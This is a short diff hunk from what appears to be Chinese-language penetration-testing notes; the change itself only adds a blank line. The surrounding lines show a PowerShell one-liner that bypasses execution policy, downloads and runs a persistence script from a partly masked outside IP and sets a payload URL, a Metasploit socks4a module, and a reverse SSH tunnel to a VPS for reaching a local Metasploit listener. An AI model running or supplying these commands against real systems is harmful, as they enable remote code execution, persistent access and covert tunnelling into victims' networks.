@@ -44,6 +44,7 @@ use auxiliary/server/socks4a
 powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://121.43.xx.xx:8888/Add-Persistence.ps1');Add-Persistence -PayloadURL http://121.xx.xx.43:8888/https5555.ps1"
 
 12、通过VPS SSH隧道使用本地msf
+
 ssh -qTfnN -R 5555:192.168.2.100:5555 root@121.xx.xx.43
 远程vps 需开启：
 vi /etc/ssh/sshd_config
